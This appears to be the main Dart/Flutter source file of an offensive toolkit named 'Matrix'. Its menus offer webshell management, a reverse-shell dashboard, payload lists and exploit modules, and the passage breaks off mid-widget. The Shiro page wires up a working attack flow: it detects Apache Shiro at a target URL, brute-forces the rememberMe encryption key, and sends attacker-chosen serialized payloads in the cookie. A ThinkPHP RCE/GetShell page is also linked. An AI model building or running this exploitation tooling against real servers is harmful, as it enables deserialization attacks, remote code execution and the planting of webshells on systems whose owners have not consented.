import 'dart:convert';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show Clipboard, ClipboardData;

import 'database/database_helper.dart';
import 'database/database_init.dart';
import 'models/project.dart';
import 'exp/shiro/shiro_crypto.dart';
import 'exp/shiro/shiro_exp_service.dart';
import 'exp/shiro/shiro_payload_repo.dart';
import 'pages/project_management_page.dart';
import 'pages/project_scoped_page.dart';
import 'pages/webshell_management_page.dart';
import 'pages/reverse_shell_dashboard_page.dart';
import 'pages/payload_management_page.dart';
import 'pages/dictionary_management_page.dart';
import 'pages/info_collection_page.dart';
import 'pages/thinkphp_exp_page.dart';
import 'services/seed_service.dart';
import 'theme/app_theme.dart';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  initDatabase(); // 初始化 SQLite（桌面端使用 FFI）
  await SeedService.seed(DatabaseHelper()); // 首次启动种子化内置默认数据
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Matrix',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.dark(
          primary: AppColors.primary,
          surface: AppColors.bgDark,
          onSurface: AppColors.textPrimary,
        ),
        brightness: Brightness.dark,
        useMaterial3: true,
        textButtonTheme: TextButtonThemeData(
          style: TextButton.styleFrom(
            textStyle: const TextStyle(fontSize: 14, inherit: false),
          ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            textStyle: const TextStyle(fontSize: 14, inherit: false),
          ),
        ),
        outlinedButtonTheme: OutlinedButtonThemeData(
          style: OutlinedButton.styleFrom(
            textStyle: const TextStyle(fontSize: 14, inherit: false),
          ),
        ),
      ),
      home: const MainLayout(),
    );
  }
}

/// 主布局：左侧菜单栏 + 右侧工作区
class MainLayout extends StatefulWidget {
  const MainLayout({super.key});

  @override
  State<MainLayout> createState() => _MainLayoutState();
}

class _MainLayoutState extends State<MainLayout> {
  int _selectedIndex = 0;
  Project? _selectedProject;
  bool _sidebarExpanded = true;
  bool _sidebarHidden = false;
  static const double _sidebarWidth = 220.0;
   // 收起时的窄侧栏宽度
  static const double _sidebarCollapsedWidth = 72.0;

  final List<MenuItem> _menuItems = [
    MenuItem(icon: Icons.folder_outlined, label: '项目管理', selectedIcon: Icons.folder),
    MenuItem(icon: Icons.search_outlined, label: '信息收集', selectedIcon: Icons.search),
    MenuItem(icon: Icons.terminal_outlined, label: 'Webshell管理', selectedIcon: Icons.terminal),
    MenuItem(icon: Icons.bug_report_outlined, label: 'EXP管理', selectedIcon: Icons.bug_report),
    MenuItem(icon: Icons.code_outlined, label: 'Payload管理', selectedIcon: Icons.code),
    MenuItem(icon: Icons.menu_book_outlined, label: '字典管理', selectedIcon: Icons.menu_book),
    MenuItem(icon: Icons.computer_outlined, label: '完整终端', selectedIcon: Icons.computer),
  ];

  void _handleMenuTap(int index) {
    setState(() => _selectedIndex = index);
  }

  Widget _buildWorkspaceContent() {
    if (_selectedIndex == 0) {
      return ProjectManagementPage(
        selectedProject: _selectedProject,
        onEnterInfoCollection: (project) {
          setState(() {
            _selectedProject = project;
            _selectedIndex = 1;
          });
        },
        onEnterExp: (project) {
          setState(() {
            _selectedIndex = 3;
          });
        },
        onEnterWebshell: (project) {
          setState(() {
            _selectedProject = project;
            _selectedIndex = 2;
          });
        },
      );
    }
    if (_selectedIndex == 1) {
      return ProjectScopedPage(
        selectedProject: _selectedProject,
        onSelectProject: (p) => setState(() => _selectedProject = p),
        onClearProject: () => setState(() => _selectedProject = null),
        onNavigateToProjectManagement: () => setState(() {
          _selectedIndex = 0;
          _selectedProject = null;
        }),
        title: '信息收集',
        icon: Icons.search,
        contentBuilder: (project, onSwitchProject) =>
            InfoCollectionLandingPage(project: project, onSwitchProject: onSwitchProject),
      );
    }
    if (_selectedIndex == 2) {
      return ProjectScopedPage(
        selectedProject: _selectedProject,
        onSelectProject: (p) => setState(() => _selectedProject = p),
        onClearProject: () => setState(() => _selectedProject = null),
        onNavigateToProjectManagement: () => setState(() {
          _selectedIndex = 0;
          _selectedProject = null;
        }),
        title: 'Webshell管理',
        icon: Icons.terminal,
        contentBuilder: (project, onSwitchProject) =>
            WebshellManagementPage(project: project, onSwitchProject: onSwitchProject),
      );
    }
    if (_selectedIndex == 4) {
      return const PayloadManagementPage();
    }
    if (_selectedIndex == 3) {
      return const _ExpContent();
    }
    if (_selectedIndex == 5) {
      return const DictionaryManagementPage();
    }
    if (_selectedIndex == 6) {
      return const ReverseShellDashboardPage();
    }
    return _WorkspaceContent(title: _menuItems[_selectedIndex].label);
  }

  @override
  Widget build(BuildContext context) {
    return LayoutBuilder(
      builder: (context, constraints) {
        final bool isMobile = constraints.maxWidth < 720;

        return Scaffold(
          body: Stack(
            children: [
              // 右侧工作区（底层）
              Positioned.fill(
                left: !isMobile && !_sidebarHidden
                    ? (_sidebarExpanded ? _sidebarWidth : _sidebarCollapsedWidth)
                    : 0,
                child: Container(
                  color: AppColors.bgDark,
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.stretch,
                    children: [
                      // 顶部栏
                      Container(
                        height: 64,
                        padding: const EdgeInsets.symmetric(horizontal: 24),
                        decoration: BoxDecoration(
                          color: AppColors.bgElevated,
                          border: Border(
                            bottom: BorderSide(
                              color: AppColors.primary.withValues(alpha: 0.4),
                              width: 1,
                            ),
                          ),
                        ),
                        child: Row(
                          children: [
                            Text(
                              _menuItems[_selectedIndex].label,
                              style: AppTextStyles.heading(
                                size: 18,
                                color: AppColors.primary,
                              ),
                            ),
                            const Spacer(),
                            IconButton(
                              icon: const Icon(Icons.search),
                              onPressed: () {},
                              color: AppColors.textSecondary,
                            ),
                            IconButton(
                              icon: const Icon(Icons.notifications_outlined),
                              onPressed: () {},
                              color: AppColors.textSecondary,
                            ),
                            const SizedBox(width: 8),
                            CircleAvatar(
                              radius: 18,
                              backgroundColor: AppColors.border,
                              child: Text(
                                'U',
                                style: AppTextStyles.heading(
                                  size: 14,
                                  color: AppColors.primary,
                                ),
                              ),
                            ),
                          ],
                        ),
                      ),
                      // 工作区内容
                      Expanded(
                        child: Padding(
                          padding: const EdgeInsets.all(24),
                          child: _buildWorkspaceContent(),
                        ),
                      ),
                    ],
                  ),
                ),
              ),

              // 手机端：菜单展开时的遮罩
              if (isMobile && !_sidebarHidden)
                Positioned.fill(
                  child: GestureDetector(
                    onTap: () => setState(() => _sidebarHidden = true),
                    child: Container(
                      color: Colors.black.withValues(alpha: 0.4),
                    ),
                  ),
                ),

              // 左侧菜单栏（上层，用位移动画实现侧滑）
              AnimatedPositioned(
                duration: const Duration(milliseconds: 200),
                curve: Curves.easeInOut,
                top: 0,
                bottom: 0,
                left: _sidebarHidden ? -_sidebarWidth : 0,
                width: _sidebarExpanded ? _sidebarWidth : _sidebarCollapsedWidth,
                child: _buildSidebar(),
              ),

              // 桌面端：隐藏后的展开按钮
              if (!isMobile && _sidebarHidden)
                Positioned(
                  left: 0,
                  top: 16,
                  child: SizedBox(
                    width: 40,
                    height: 40,
                    child: IconButton(
                      padding: EdgeInsets.zero,
                      iconSize: 20,
                      splashRadius: 20,
                      onPressed: () => setState(() => _sidebarHidden = false),
                      icon: const Icon(Icons.chevron_right, color: AppColors.textSecondary),
                      tooltip: '展开菜单',
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildSidebar() {
    return LayoutBuilder(
      builder: (context, constraints) {
        final t = ((constraints.maxWidth - _sidebarCollapsedWidth) /
                (_sidebarWidth - _sidebarCollapsedWidth))
            .clamp(0.0, 1.0);
        return _buildSidebarContent(t);
      },
    );
  }

  Widget _buildSidebarContent(double t) {
    // Label elements fade in during the second half of expansion
    final labelOpacity = ((t - 0.3) / 0.5).clamp(0.0, 1.0);

    return Container(
      decoration: BoxDecoration(
        color: AppColors.bgDark,
        boxShadow: [
          BoxShadow(
            color: AppColors.primary.withValues(alpha: 0.08),
            blurRadius: 12,
            offset: const Offset(2, 0),
          ),
        ],
      ),
      child: Column(
        children: [
          // Logo area — icon always left-aligned, title + close fade in
          SizedBox(
            height: 64,
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Row(
                children: [
                  Container(
                    width: 36,
                    height: 36,
                    decoration: BoxDecoration(
                      color: AppColors.primary.withValues(alpha: 0.2),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(
                        color: AppColors.primary,
                        width: 1,
                      ),
                    ),
                    child: const Icon(
                      Icons.grid_view_rounded,
                      color: AppColors.primary,
                      size: 20,
                    ),
                  ),
                  Expanded(
                    child: Opacity(
                      opacity: labelOpacity,
                      child: Row(
                        children: [
                          const SizedBox(width: 12),
                          Expanded(
                            child: Text(
                              'Matrix',
                              style: AppTextStyles.title(
                                size: 20,
                                color: AppColors.textPrimary,
                              ),
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),

          const Divider(height: 1, color: AppColors.border),

          // 菜单项
          Expanded(
            child: ListView.builder(
              padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
              itemCount: _menuItems.length,
              itemBuilder: (context, index) {
                final item = _menuItems[index];
                final isSelected = _selectedIndex == index;
                return _SidebarMenuItem(
                  item: item,
                  isSelected: isSelected,
                  expandProgress: t,
                  onTap: () => _handleMenuTap(index),
                );
              },
            ),
          ),

          // 折叠按钮 — 箭头随动画旋转，文字渐显
          Padding(
            padding: const EdgeInsets.all(8.0),
            child: InkWell(
              onTap: () => setState(() => _sidebarExpanded = !_sidebarExpanded),
              borderRadius: BorderRadius.circular(8),
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 12),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.start,
                  children: [
                    Transform.rotate(
                      angle: t * pi,
                      child: const Icon(
                        Icons.chevron_right,
                        color: AppColors.textSecondary,
                        size: 24,
                      ),
                    ),
                    Flexible(
                      child: Opacity(
                        opacity: labelOpacity,
                        child: Padding(
                          padding: const EdgeInsets.only(left: 12),
                          child: Text(
                            '收起',
                            style: AppTextStyles.caption(
                              size: 14,
                              color: AppColors.textSecondary,
                            ),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _ExpContent extends StatelessWidget {
  const _ExpContent();

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: AppColors.bgCard,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: AppColors.primary.withValues(alpha: 0.5)),
          ),
          child: Row(
            children: [
              const Icon(Icons.bug_report, color: AppColors.primary, size: 32),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'EXP 管理',
                      style: AppTextStyles.heading(size: 18, color: AppColors.primary),
                    ),
                    Text(
                      '在这里集中管理各类漏洞利用模块，点击条目进入对应利用界面',
                      style: AppTextStyles.caption(size: 14, color: AppColors.cyan),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
        const SizedBox(height: 24),
        Expanded(
          child: ListView.separated(
            padding: const EdgeInsets.only(bottom: 16),
            itemCount: 2,
            separatorBuilder: (_, __) => const SizedBox(height: 12),
            itemBuilder: (context, index) {
              if (index == 0) {
                return _ExpEntryCard(
                  icon: Icons.cookie,
                  title: 'Apache Shiro 反序列化',
                  subtitle: 'rememberMe Key 爆破 / Payload 注入',
                  tag: 'Java · 通用',
                  onTap: () {
                    Navigator.of(context).push(
                      MaterialPageRoute(
                        builder: (_) => const ShiroExpPage(),
                      ),
                    );
                  },
                );
              }
              return _ExpEntryCard(
                icon: Icons.php,
                title: 'ThinkPHP 漏洞利用',
                subtitle: '3.x/5.x/6.x 漏洞检测、RCE、GetShell',
                tag: 'PHP · 通用',
                onTap: () {
                  Navigator.of(context).push(
                    MaterialPageRoute(
                      builder: (_) => const ThinkphpExpPage(),
                    ),
                  );
                },
              );
            },
          ),
        ),
      ],
    );
  }
}

class ShiroExpPage extends StatelessWidget {
  const ShiroExpPage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.bgDark,
      appBar: AppBar(
        backgroundColor: AppColors.bgElevated,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back),
          onPressed: () => Navigator.of(context).pop(),
        ),
        title: Row(
          children: [
            const Icon(Icons.cookie, color: AppColors.primary),
            const SizedBox(width: 8),
            Text(
              'Apache Shiro 反序列化利用',
              style: AppTextStyles.heading(size: 14, color: AppColors.primary),
            ),
          ],
        ),
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              decoration: BoxDecoration(
                color: AppColors.bgCard,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: AppColors.border),
                boxShadow: [
                  BoxShadow(
                    color: AppColors.primary.withValues(alpha: 0.06),
                    blurRadius: 12,
                    offset: const Offset(0, 2),
                  ),
                ],
              ),
              child: Row(
                children: [
                  Container(
                    width: 44,
                    height: 44,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                        colors: [
                          AppColors.primary.withValues(alpha: 0.2),
                          AppColors.primary.withValues(alpha: 0.08),
                        ],
                      ),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                        color: AppColors.primary.withValues(alpha: 0.4),
                        width: 1,
                      ),
                    ),
                    child: const Icon(Icons.security, color: AppColors.primary, size: 22),
                  ),
                  const SizedBox(width: 16),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'rememberMe Key 爆破与利用',
                          style: AppTextStyles.heading(
                            size: 14,
                            color: AppColors.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          '支持 AES-CBC / AES-GCM，字典爆破 Key 后加载自定义 Payload',
                          style: AppTextStyles.caption(
                            size: 12,
                            color: AppColors.textSecondary,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 16),
            const Expanded(child: _ShiroExpCard()),
          ],
        ),
      ),
    );
  }
}

class _ExpEntryCard extends StatelessWidget {
  final IconData icon;
  final String title;
  final String subtitle;
  final String tag;
  final VoidCallback? onTap;

  const _ExpEntryCard({
    required this.icon,
    required this.title,
    required this.subtitle,
    required this.tag,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    final enabled = onTap != null;
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(12),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
          decoration: BoxDecoration(
            color: enabled ? AppColors.bgCard : AppColors.bgCard.withValues(alpha: 0.7),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: AppColors.border),
          ),
          child: Row(
            children: [
              Container(
                width: 48,
                height: 48,
                decoration: BoxDecoration(
                  color: AppColors.primary.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: AppColors.primary.withValues(alpha: 0.5)),
                ),
                child: Icon(icon, color: AppColors.primary, size: 24),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text(
                      title,
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                      style: AppTextStyles.heading(
                        size: 15,
                        color: AppColors.textPrimary,
                      ),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      subtitle,
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                      style: AppTextStyles.caption(
                        size: 13,
                        color: AppColors.textSecondary,
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 12),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  color: AppColors.bgElevated,
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppColors.border),
                ),
                child: Text(
                  tag,
                  style: AppTextStyles.caption(
                    size: 12,
                    color: AppColors.textSecondary,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

class _ShiroExpCard extends StatefulWidget {
  const _ShiroExpCard();

  @override
  State<_ShiroExpCard> createState() => _ShiroExpCardState();
}

class _ShiroExpCardState extends State<_ShiroExpCard> {
  final _urlController = TextEditingController();
  final _cookieNameController = TextEditingController();
  final _timeoutController = TextEditingController();
  final _keyController = TextEditingController();
  final _payloadB64Controller = TextEditingController();
  final _logScrollController = ScrollController();

  String _method = 'GET';

  String? get _currentKey => _keyController.text.trim().isNotEmpty
      ? _keyController.text.trim()
      : null;

  @override
  void dispose() {
    _urlController.dispose();
    _cookieNameController.dispose();
    _timeoutController.dispose();
    _keyController.dispose();
    _payloadB64Controller.dispose();
    _logScrollController.dispose();
    super.dispose();
  }

  ShiroEncryptionMode _encryptionMode = ShiroEncryptionMode.cbc;
  String _log = '';
  bool _running = false;
  bool _verboseMode = false;
  final _payloadRepo = const ShiroPayloadRepo();

  void _appendLog(String line) {
    setState(() {
      final existing = _log.isEmpty ? <String>[] : _log.split('\n');
      existing.add(line);
      const maxLines = 500;
      final trimmed =
          existing.length > maxLines ? existing.sublist(existing.length - maxLines) : existing;
      _log = trimmed.join('\n');
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScrollController.hasClients) {
        _logScrollController.animateTo(
          _logScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 100),
          curve: Curves.easeOut,
        );
      }
    });
  }

  Future<void> _handleCheckShiro() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 检测 Shiro: $url');
    try {
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      final ok = await svc.checkIsShiro();
      _appendLog(ok ? '[+] 发现 Shiro 框架' : '[-] 未检测到 Shiro');
    } catch (e) {
      _appendLog('[!] 检测异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleBruteforce() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    // 检测 / 爆破 Key 始终使用内置 principal payload
    const payloadFile = 'shiro_payload_principal.b64';
    setState(() => _running = true);
    _appendLog('[*] 从 data/$payloadFile 加载序列化 payload（为空则使用默认 principal）...');
    try {
      final payload = await _payloadRepo.loadPayload(payloadFile);
      if (payload.isEmpty) {
        _appendLog('[-] 未能读取 payload 文件或内容为空');
        return;
      }
      final keys = await _payloadRepo.loadKeys();
      if (keys.isEmpty) {
        _appendLog('[-] data/shiro_keys.txt 为空或未找到');
        return;
      }
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      _appendLog('[*] 开始爆破 key，候选数：${keys.length}');
      String? found;
      found = await svc.bruteForceKey(
        candidateKeysBase64: keys,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
        verbose: _verboseMode,
      );
      if (found != null) {
        setState(() {
          _keyController.text = found!;
        });
        _appendLog('[+] 爆破成功，已选中当前 Key：$found');
      } else {
        _appendLog('[!] 未找到可用 key');
      }
    } catch (e) {
      _appendLog('[!] 爆破异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleVerifyKey() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    final key = _currentKey;
    if (key == null) {
      _appendLog('[!] 请先爆破出 Key 或输入 Key');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 验证 Key: $key');
    try {
      const payloadFile = 'shiro_payload_principal.b64';
      final payload = await _payloadRepo.loadPayload(payloadFile);
      if (payload.isEmpty) {
        _appendLog('[-] 未能加载 principal payload');
        return;
      }
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      final ok = await svc.verifyKey(
        keyBase64: key,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
      );
      _appendLog(ok ? '[+] Key 验证通过' : '[-] Key 验证失败');
    } catch (e) {
      _appendLog('[!] 验证异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleSendPayload() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    final key = _currentKey;
    if (key == null) {
      _appendLog('[!] 请先爆破出 Key 或输入 Key');
      return;
    }
    var b64 = _payloadB64Controller.text.trim().replaceAll(RegExp(r'\s+'), '');
    if (b64.isEmpty) {
      _appendLog('[!] 请输入 Payload Base64');
      return;
    }
    if (b64.contains('%')) {
      b64 = Uri.decodeComponent(b64);
    }

    List<int> payload;
    try {
      payload = base64.decode(b64);
    } catch (e) {
      _appendLog('[!] Base64 解码失败: $e');
      return;
    }

    setState(() => _running = true);
    _appendLog('[*] 发送 Payload，使用 Key：$key');
    try {
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      final res = await svc.sendExploitOnce(
        keyBase64: key,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
      );
      final code = res.statusCode;
      if (code >= 200 && code < 300) {
        _appendLog('[+] 发送完成，HTTP: $code');
      } else if (code == 400) {
        _appendLog('[+] 发送完成，HTTP: 400（payload 可能已执行，请尝试访问注入的 URL 验证）');
      } else {
        _appendLog('[+] 发送完成，HTTP: $code');
      }
      if (res.body.trim().isNotEmpty) {
        final snippet = res.body.length > 500 ? '${res.body.substring(0, 500)}...' : res.body;
        _appendLog('[i] 响应体: $snippet');
      }
    } catch (e) {
      _appendLog('[!] 发送异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.border),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: AppColors.primary.withValues(alpha: 0.12),
                  borderRadius: BorderRadius.circular(6),
                ),
                child: const Icon(Icons.cookie, color: AppColors.primary, size: 18),
              ),
              const SizedBox(width: 10),
              Text(
                'Shiro 反序列化',
                style: AppTextStyles.heading(
                  size: 14,
                  color: AppColors.textPrimary,
                ),
              ),
              const SizedBox(width: 12),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(
                  color: AppColors.cyan.withValues(alpha: 0.2),
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppColors.cyan.withValues(alpha: 0.5)),
                ),
                child: Text(
                  'Cookie: ${_cookieNameController.text.trim().isNotEmpty ? _cookieNameController.text.trim() : 'rememberMe'}',
                  style: AppTextStyles.caption(size: 10, color: AppColors.cyan),
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Expanded(
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                Flexible(
                  flex: 1,
                  child: SingleChildScrollView(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        _shiroSectionTitle('目标配置'),
                        TextField(
                          controller: _urlController,
                          style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                          decoration: _shiroInputDecoration('目标 URL', 'https://target.com/login'),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Expanded(
                              child: DropdownButtonFormField<String>(
                                value: _method,
                                dropdownColor: AppColors.bgElevated,
                                icon: Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                                style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                items: const [
                                  DropdownMenuItem(value: 'GET', child: Text('GET')),
                                  DropdownMenuItem(value: 'POST', child: Text('POST')),
                                ],
                                onChanged: (v) { if (v != null) setState(() => _method = v); },
                                decoration: _shiroInputDecoration('方法', ''),
                              ),
                            ),
                            const SizedBox(width: 8),
                            Expanded(
                              child: DropdownButtonFormField<ShiroEncryptionMode>(
                                value: _encryptionMode,
                                dropdownColor: AppColors.bgElevated,
                                icon: Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                                style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                items: const [
                                  DropdownMenuItem(value: ShiroEncryptionMode.cbc, child: Text('AES-CBC')),
                                  DropdownMenuItem(value: ShiroEncryptionMode.gcm, child: Text('AES-GCM')),
                                ],
                                onChanged: (v) { if (v != null) setState(() => _encryptionMode = v); },
                                decoration: _shiroInputDecoration('模式', ''),
                              ),
                            ),
                            const SizedBox(width: 8),
                            Expanded(
                              child: TextField(
                                controller: _timeoutController,
                                style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                                decoration: _shiroInputDecoration('超时(s)', '10'),
                                keyboardType: TextInputType.number,
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        TextField(
                          controller: _cookieNameController,
                          onChanged: (_) => setState(() {}),
                          style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                          decoration: _shiroInputDecoration('Cookie 名', 'rememberMe'),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Checkbox(
                              value: _verboseMode,
                              onChanged: (v) { if (v != null) setState(() => _verboseMode = v); },
                            ),
                            Text('详细日志', style: AppTextStyles.caption(size: 11)),
                          ],
                        ),
                        const SizedBox(height: 16),
                        _shiroSectionTitle('Key 与 Payload'),
                        TextField(
                          controller: _keyController,
                          onChanged: (_) => setState(() {}),
                          style: AppTextStyles.body(
                            size: 12,
                            color: _currentKey == null ? AppColors.textMuted : AppColors.cyan,
                          ),
                          decoration: _shiroInputDecoration('当前 Key', '爆破后自动填充').copyWith(
                            suffixIcon: _currentKey == null
                                ? const Icon(Icons.vpn_key_outlined, size: 16, color: AppColors.textSecondary)
                                : const Icon(Icons.check_circle, size: 16, color: AppColors.cyan),
                          ),
                        ),
                        const SizedBox(height: 8),
                        TextField(
                          controller: _payloadB64Controller,
                          maxLines: 4,
                          style: AppTextStyles.terminal(size: 11, color: AppColors.cyan),
                          decoration: _shiroInputDecoration('Payload Base64', '粘贴 Base64 编码的序列化 Payload'),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            _shiroActionBtn('检测 Shiro', _handleCheckShiro),
                            const SizedBox(width: 8),
                            _shiroActionBtn('爆破 Key', _handleBruteforce),
                            const SizedBox(width: 8),
                            _shiroActionBtn('验证 Key', _handleVerifyKey, enabled: _currentKey != null),
                            const SizedBox(width: 8),
                            _shiroActionBtn('发送 Payload', _handleSendPayload, enabled: _currentKey != null),
                          ],
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(width: 16),
                Flexible(
                  flex: 1,
                  child: Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: AppColors.bgDark,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: AppColors.border),
                    ),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.stretch,
                      children: [
                        Row(
                          children: [
                            Container(
                              width: 6,
                              height: 6,
                              margin: const EdgeInsets.only(right: 6),
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: _running ? AppColors.primary : AppColors.textMuted,
                              ),
                            ),
                            Text(
                              _running ? '运行中' : '空闲',
                              style: AppTextStyles.caption(
                                size: 11,
                                color: _running ? AppColors.primary : AppColors.textSecondary,
                              ),
                            ),
                            const Spacer(),
                            TextButton.icon(
                              onPressed: _log.isEmpty ? null : () async {
                                await Clipboard.setData(ClipboardData(text: _log));
                                if (mounted) {
                                  ScaffoldMessenger.of(context).showSnackBar(
                                    const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
                                  );
                                }
                              },
                              icon: const Icon(Icons.copy, size: 14),
                              label: const Text('复制'),
                              style: TextButton.styleFrom(
                                foregroundColor: AppColors.textSecondary,
                                textStyle: const TextStyle(fontSize: 11),
                              ),
                            ),
                            TextButton.icon(
                              onPressed: _log.isEmpty ? null : () => setState(() => _log = ''),
                              icon: const Icon(Icons.clear_all, size: 14),
                              label: const Text('清空'),
                              style: TextButton.styleFrom(
                                foregroundColor: AppColors.textSecondary,
                                textStyle: const TextStyle(fontSize: 11),
                              ),
                            ),
                          ],
                        ),
                        const Divider(height: 1, color: AppColors.border),
                        const SizedBox(height: 4),
                        Expanded(
